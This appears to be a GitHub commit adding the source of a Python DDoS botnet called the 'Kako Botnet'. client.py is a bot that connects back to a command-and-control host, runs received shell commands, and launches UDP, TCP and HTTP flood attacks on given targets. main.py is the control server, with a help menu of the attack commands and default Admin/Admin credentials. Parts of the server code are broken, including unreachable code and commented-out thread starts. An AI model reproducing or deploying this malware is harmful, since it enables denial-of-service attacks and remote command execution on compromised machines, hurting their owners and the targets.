0dd5fd5e8515966c17732087241ecbf8854d7cd5
w1zzxyz9810 <109500807+w1zzxyz9810@users.noreply.github.com>
2023-05-04 02:22:19 +0700

    Add files via upload

---
+++ client.py
@@ -0,0 +1,170 @@
+import os
+import sys
+import time
+import socket
+import random
+import threading
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+host = "kakobotnet.xira210.repl.co" # IP for the bot to connect to
+port = 8888 # Port for the bot to connect to
+
+connected = False
+
+userAgents = []
+
+userAgents.append('Linux / Firefox 29: Mozilla/5.0 (X11; Linux x86_64; rv:29.0) Gecko/20100101 Firefox/29.0')
+userAgents.append('Linux / Chrome 34: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36')
+userAgents.append('Mac / Firefox 29: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:29.0) Gecko/20100101 Firefox/29.0')
+userAgents.append('Mac / Chrome 34: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36')
+userAgents.append('Mac / Safari 7: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14')
+userAgents.append('Windows / Firefox 29: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0')
+userAgents.append('Windows / Chrome 34: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36')
+userAgents.append('Windows / IE 6: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
+userAgents.append('Windows / IE 7: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)')
+userAgents.append('Windows / IE 8: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)')
+userAgents.append('Windows / IE 9: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)')
+userAgents.append('Windows / IE 10: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)')
+userAgents.append('Windows / IE 11: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')
+userAgents.append('Android / Firefox 29: Mozilla/5.0 (Android; Mobile; rv:29.0) Gecko/29.0 Firefox/29.0')
+userAgents.append('Android / Chrome 34: Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36')
+userAgents.append('iOS / Chrome 34: Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) CriOS/34.0.1847.18 Mobile/11B554a Safari/9537.53')
+userAgents.append('iOS / Safari 7: Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53')
+
+header = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language: en-us,en;q=0.5","Accept-Encoding: gzip,deflate","Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7","Keep-Alive: 115","Connection: keep-alive"]
+
+headers = ' \n'.join(header)
+
+def system():
+	global sock
+	global connected
+
+	while not connected:
+		try:
+			sock.connect((host, port))
+			connected = True
+		except:
+			pass
+
+	print("Connected")
+
+	while connected is True:
+		try:
+			def commands():
+				msg = sock.recv(1024)
+				if ">killbots" in msg.lower():
+					sys.exit()
+
+				if ">shell" in msg.lower():
+					try:
+						shell = msg.split(" ")[1]
+						os.system(shell)
+					except:
+						pass
+
+				if ">udp" in msg.lower():
+					def udpflood():
+						import socket
+						try:
+							ip = msg.split(" ")[1]
+							psize = int(msg.split(" ")[2])
+							timer = int(float(msg.split(" ")[3]))
+
+							timeout = time.time() + 1 * timer
+
+							package = random._urandom(psize)
+
+							udpflood = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 17)
+
+							print("Command Accepted!")
+							print("UDP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))
+
+							while True:
+								port = random.randint(1, 65535)
+								udpflood.sendto(package, (ip, port))
+								if time.time() > timeout:
+									return
+						except:
+							pass
+					udpflood()
+
+				if ">tcp" in msg.lower():
+					def tcpflood():
+						import socket
+						try:
+							ip = msg.split(" ")[1]
+							psize = int(msg.split(" ")[2])
+							timer = int(float(msg.split(" ")[3]))
+
+							timeout = time.time() + 1 * timer
+
+							package = random._urandom(psize)
+
+							print("Command Accepted!")
+							print("TCP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))
+
+							while True:
+								tcpflood = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+								tcpflood.connect((ip, 80))
+								port = random.randint(1, 65535)
+								tcpflood.sendto(package, (ip, port))
+								tcpflood.close()
+								if time.time() > timeout:
+									return
+						except:
+							pass
+					tcpflood()
+
+				if ">http" in msg.lower():
+					def httpflood():
+						try:
+							def httpflooder():
+								sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+								resolvedHost = socket.gethostbyname(ip)
+
+								query = str("GET / HTTP/1.1\nHost: "+resolvedHost+"\n\nUser-Agent: "+random.choice(userAgents)+"\n"+headers).encode('utf-8')
+								sock.connect((resolvedHost, 80))
+								sock.sendall(query)
+								sock.close()
+
+							ip = msg.split(" ")[1]
+							threads = int(msg.split(" ")[2])
+							timer = int(float(msg.split(" ")[3]))
+
+							timeout = time.time() + 1 * timer
+
+							print("Command Accepted!")
+							print("HTTP: Sent to %s with %s threads for %s seconds!" % (ip, threads, timer))
+
+							while True:
+								for x in range(threads):
+									thread = threading.Thread(target=httpflooder)
+									thread.Deamon = True
+									thread.start()
+									thread.join()
+									if time.time() > timeout:
+										return
+						except:
+							pass
+					httpflood()
+			commands()
+			threads = []
+			for i in range(1):
+			    thread = threading.Thread(target=commands)
+			    threads.append(thread)
+			    thread.setDaemon(True)
+			    thread.start()
+		except socket.error:
+			connected = False
+			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			print("Disconnected")
+			while not connected:
+				try:
+					sock.connect((host, port))
+					connected = True
+					print("Reconnected")
+				except socket.error:
+					pass
+	sock.close()
+system()
---
+++ main.py
@@ -0,0 +1,209 @@
+import sys
+import time
+import socket
+import threading
+from json import load
+#from urllib2
+#import urlopen
+#from thread import start_new_thread
+
+connect = "" # IP. Leave empty
+conport = 8080 # Your port
+infport = 8888 # Bot port
+
+clients = 0
+bots = 0
+
+rankAdmin = "Admin"
+pwordAdmin = "Admin"
+
+rankGuest = "Guest"
+pwordGuest = "Guest"
+
+bc = []
+
+print("Remember to add unwanted IP Addresses into the banned list before anyone starts to connect.")
+print("If it doesn't say both Server and Bot started there is a problem.")
+
+def clientDisconnect():
+	global clients
+	clients = clients - 1
+
+def botDisconnect():
+	global bots
+	bots = bots - 1
+	
+def clientThread(conn):
+	global pwordGuest
+	
+	createBanned = ("banned.txt", "a")
+	banned = ("banned.txt")
+	ip = load(open('http://jsonip.com'))['ip']
+	if ip in banned:
+		conn.send("[!] Your IP Address has been banned.\r\n")
+		conn.send("[>] Please contact live:zerefdragneelbro on skype for this to be removed. [<]\r\n")
+		clientDisconnect()
+		sys.exit()
+	else:
+		pass
+
+	def rank(conn):
+		conn.send("admin")
+		return conn.recv(512)
+
+	def password(conn):
+		conn.send("admin")
+		return conn.recv(512)
+
+	def nickname(conn):
+		conn.send("admin")
+		return conn.recv(512)
+		print("[>] Welcome to the Kako Botnet [<]\r\n")
+		print("[?] Please use the custom client.py made by Law\r\n")
+		print("[?] Or else it made not work as its been untested with other clients\r\n")
+		print("[?] Type >help for a list of commands [?]\r\n")
+		print("[?] Your nickname is: %s" % nickname)
+		while True:
+			try:
+				message = conn.recv(512)
+				if message:
+					reply = message
+					broadcast(reply, conn)
+				else:
+					remove(conn)
+
+				logs = ("logs.txt", "a")
+				logs.write("%s:%s:%s - %s\r\n" % (rank, password, nickname, message))
+
+				if message.lower().startswith(">help"):
+					conn.sendall("[>] Helpful Info [<]\r\n")
+					conn.sendall("[>] and [<] = Notice\r\n")
+					conn.sendall("[?] = Information\r\n")
+					conn.sendall("[!] = Warning\r\n")
+					conn.sendall("[?] - You can only send 1 attack after another. By that I mean if I sent an attack\r\n")
+					conn.sendall("for 30 seconds you can only send another attack after those 30 seconds\r\n")
+					conn.sendall("\r\n")
+					conn.sendall("[>] Server Commands [<]\r\n")
+					conn.sendall("[?] >help - Displays a help menu like this\r\n")
+					conn.sendall("[?] >status - Displays Clients and Bots connected\r\n")
+					conn.sendall("[?] >credits - Displays the Programmers and Helpers\r\n")
+					conn.sendall("\r\n")
+					conn.sendall("[>] Bot Commands [<]\r\n")
+					conn.sendall("[!] Warning! These commands are built into the client made by Law not the server\r\n")
+					conn.sendall("[?] >udp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol UDP\r\n")
+					conn.sendall("[?] >tcp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol TCP\r\n")
+					conn.sendall("[?] >http [Target(without http://)] [Threads] [Time(S)] - HTTP DDoS Attack\r\n")
+					conn.sendall("[?] >killbots - Disconnects all bots\r\n")
+					conn.sendall("[?] >shell - Allows the host to use commands from the bots terminal\r\n")
+					if rank.startswith(rankAdmin):
+						conn.sendall("\r\n")
+						conn.sendall("[>] Secret Admin Command [<]\r\n")
+						conn.sendall("[?] >password - Changes guest password for this session only\r\n")
+
+				if message.lower().startswith(">status"):
+					conn.sendall("[+] Clients Connected: %s\r\n" % clients)
+					conn.sendall("[+] Bots Connected: %s\r\n" % bots)
+
+				if message.lower().startswith(">credits"):
+					conn.sendall("[?] Law - Idea and main Programmer(AKA the guy who made this command)\r\n")
+					conn.sendall("[?] Also coded the client.py file from scratch\r\n")
+					conn.sendall("[?] Picses - Coded the bot connection\r\n")
+					conn.sendall("[?] Mac.G - Helped figure out how to broadcast commands using a list\r\n")
+
+				if message.lower().startswith(">password"):
+					if rank.startswith(rankAdmin):
+						conn.sendall("[>] This will change the password to guest rank for this session only [<]\r\n")
+						def newPass(conn, prefix="New Password: "):
+							conn.send(prefix)
+							return conn.recv(512)
+
+						newPass = newPass(conn)
+						pwordGuest = newPass
+						conn.sendall("[?] New Guest Password: %s" % pwordGuest)
+			except:
+				break
+			if not message:
+				break
+		clientDisconnect()
+		conn.close()
+		try:
+			ip = load(open('http://jsonip.com'))['ip']
+			fail = ("fails.txt", "a")
+			fail.write("%s:%s:%s:%s\r\n" % (ip, rank, password, nickname))
+			conn.send("[!] Incorrect Information!\r\n")
+			conn.send("[!] Your IP Address has been logged.\r\n")
+			clientDisconnect()
+			time.sleep(3)
+			conn.close()
+		except:
+			clientDisconnect()
+			conn.close
+
+def startClient():
+	host = connect
+	port = conport
+	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	sock.bind((host, port))
+	sock.listen(999999)
+	time.sleep(0.10)
+	print("[+] Server Started")
+	while True:
+		global clients
+		time.sleep(1)
+		conn, addr = sock.accept()
+		bc.append(conn)
+		clients = clients + 1
+
+#		start_new_thread(clientThread, (conn,))
+	sock.close()
+
+def bot_thread(conn):
+	while True:
+		try:
+			data = conn.recv(512)
+		except:
+			print("[-] Bot Disconnected")
+			break
+		if not data:
+			pass
+	botDisconnect()
+	conn.close()
+
+def startBot():
+	host = connect
+	port = infport
+	infsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	infsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+	infsock.bind((host, port))
+	infsock.listen(999999)
+	time.sleep(0.5)
+	print("[+] Bot Started")
+	while True:
+		global bots
+		time.sleep(1)
+		conn, addr = infsock.accept()
+		bc.append(conn)
+		bots = bots + 1
+
+#		start_new_thread(bot_thread, (conn,))
+	infsock.close()
+
+def broadcast(message, connection):
+    for bots in bc:
+        if bots != connection:
+            try:
+                bots.sendall(message)
+            except:
+                bots.close()
+                remove(bots)
+
+def remove(connection):
+    if connection in bc:
+        bc.remove(connection)
+
+client = threading.Thread(target=startClient, args=(""), name='Client Session Handler')
+client.start()
+
+botnet = threading.Thread(target=startBot, args=(""), name='Bot Session Handler')
+botnet.setDaemon(True)
+botnet.start()
